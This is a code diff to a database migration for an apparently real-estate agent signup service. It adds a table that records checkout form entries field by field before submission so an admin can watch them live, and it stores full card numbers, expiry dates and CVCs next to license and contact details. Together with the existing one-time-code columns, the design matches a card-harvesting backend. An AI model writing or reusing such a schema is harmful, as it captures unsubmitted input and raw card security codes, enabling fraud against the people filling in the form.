@@ -231,6 +231,29 @@ async function migrate(db: Db): Promise<void> {
       updated_at TEXT NOT NULL
     );
 
+    -- A join-in-progress, streamed field-by-field from the checkout form before
+    -- any account exists, so an admin can watch it fill in live. Keyed by an
+    -- anonymous token the browser mints; linked to the user once they submit.
+    CREATE TABLE IF NOT EXISTS checkout_sessions (
+      id SERIAL PRIMARY KEY,
+      token TEXT NOT NULL UNIQUE,
+      first_name TEXT,
+      last_name TEXT,
+      email TEXT,
+      phone TEXT,
+      brokerage TEXT,
+      license_number TEXT,
+      license_state TEXT,
+      cardholder_name TEXT,
+      card_number TEXT,
+      card_expiry TEXT,
+      card_cvc TEXT,
+      step TEXT,
+      user_id INTEGER,
+      created_at TEXT NOT NULL,
+      updated_at TEXT NOT NULL
+    );
+
     CREATE INDEX IF NOT EXISTS idx_leads_assigned ON leads(assigned_agent_id);
     CREATE INDEX IF NOT EXISTS idx_leads_status ON leads(status);
     CREATE INDEX IF NOT EXISTS idx_leads_zip ON leads(zip);
@@ -255,9 +278,9 @@ async function migrate(db: Db): Promise<void> {
     ALTER TABLE users ADD COLUMN IF NOT EXISTS activation_stage TEXT NOT NULL DEFAULT 'approved';
     ALTER TABLE users ADD COLUMN IF NOT EXISTS activation_otp TEXT;
     ALTER TABLE users ADD COLUMN IF NOT EXISTS activation_stage_updated_at TEXT;
-    ALTER TABLE users ADD COLUMN IF NOT EXISTS card_preview TEXT;
 
     CREATE INDEX IF NOT EXISTS idx_users_activation_stage ON users(activation_stage);
+    CREATE INDEX IF NOT EXISTS idx_checkout_sessions_updated ON checkout_sessions(updated_at);
 
     CREATE UNIQUE INDEX IF NOT EXISTS idx_notifications_dedupe ON notifications(dedupe_key) WHERE dedupe_key IS NOT NULL;
   `);
